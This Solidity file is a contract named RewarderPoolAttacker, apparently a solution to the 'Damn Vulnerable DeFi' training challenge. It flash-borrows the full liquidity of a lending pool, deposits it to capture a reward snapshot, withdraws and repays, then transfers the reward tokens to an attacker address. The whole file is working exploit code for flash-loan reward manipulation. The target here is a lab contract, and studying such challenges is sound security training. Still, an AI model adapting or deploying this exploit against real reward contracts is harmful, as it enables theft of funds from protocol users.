// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title RewarderPoolAttacker
 * @author MJ
 * @notice A contract to attack the RewarderPool contract
 */
contract RewarderPoolAttacker {
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    address public attackerAddress;


    constructor (address _flashLoanerPool, address _theRewarderPool, address _attackerAddress) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);

        liquidityToken = flashLoanerPool.liquidityToken();
        rewardToken = theRewarderPool.rewardToken();

       attackerAddress =  _attackerAddress;
    }

    /**
     * @notice Flash loans a bunch of liquidity tokens from the FlashLoanerPool
     */
    function attack() external {
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
    }

    /**
     * @notice Receives the flash loaned liquidity tokens and deposits them into the rewarder pool
     *         to receive rewards, then withdraws the liquidity tokens and returns them to the FlashLoanerPool.
     *         Finally, transfers the reward tokens to the attacker.
     * @param _amount Amount of liquidity tokens to be deposited into the pool
     */
    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        liquidityToken.transfer(msg.sender, _amount);
        // Transfer the reward tokens to the attacker
        rewardToken.transfer(attackerAddress, rewardToken.balanceOf(address(this)));
    }
}